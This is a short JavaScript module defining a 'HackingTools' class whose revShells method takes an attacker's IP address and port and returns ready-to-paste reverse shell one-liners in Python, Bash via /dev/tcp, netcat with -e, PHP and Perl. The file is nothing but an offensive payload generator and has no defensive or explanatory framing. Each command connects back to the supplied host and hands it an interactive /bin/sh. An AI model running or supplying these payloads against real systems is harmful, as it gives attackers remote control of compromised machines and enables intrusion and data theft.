'use strict'

class HackingTools{



async revShells(array){
    const ip = array[1]
    const port = array[2]

    let php = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`

    let python = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

    let bash = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`

    let nc = `nc -e /bin/sh ${ip} ${port}`
 
    let perl = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`


    let msg =`\`\`\`bash

    Python: ${python}
    
    Bash: ${bash}

    NC: ${nc}

    PHP: ${php}
    
    Perl: ${perl}
    
    \`\`\`
    `


    console.log(msg.length)


    return msg

}



}



module.exports = HackingTools
